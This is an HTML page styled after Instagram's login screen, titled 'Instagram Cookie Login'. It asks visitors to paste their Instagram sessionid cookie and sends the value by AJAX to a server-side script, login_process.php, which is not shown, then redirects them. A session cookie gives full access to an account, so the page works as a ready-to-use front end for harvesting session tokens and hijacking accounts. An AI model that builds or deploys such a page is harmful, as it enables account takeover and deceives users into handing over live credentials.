<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Cookie Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #fff; padding: 30px; border: 1px solid #dbdbdb; border-radius: 4px; width: 350px; text-align: center; }
        .login-box h2 { margin-bottom: 20px; font-family: monospace; color: #262626; }
        .input-field { width: 100%; padding: 10px; margin-bottom: 12px; border: 1px solid #efefef; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        .login-btn { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; font-weight: bold; border-radius: 3px; cursor: pointer; }
        .login-btn:hover { background: #1877f2; }
        .error-msg { color: #ed4956; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Instagram Cookie Login</h2>
    <form id="cookieLoginForm">
        <input type="text" name="sessionid" class="input-field" placeholder="Paste your Instagram sessionid here" required autocomplete="off">
        <button type="submit" class="login-btn">Log In with Cookie</button>
        <div id="errorAlert" class="error-msg"></div>
    </form>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $('#cookieLoginForm').submit(function(e) {
        e.preventDefault();
        var sessionId = $('input[name="sessionid"]').val();
        $('#errorAlert').text('');

        $.ajax({
            type: "POST",
            url: "login_process.php",
            data: { sessionid: sessionId },
            dataType: "json",
            success: function(response) {
                if(response.status === 'success') {
                    window.location.href = response.returnUrl;
                } else {
                    $('#errorAlert').text(response.error || 'Invalid session cookie!');
                }
            },
            error: function() {
                $('#errorAlert').text('An error occurred. Please try again.');
            }
        });
    });
</script>

</body>
    </html>
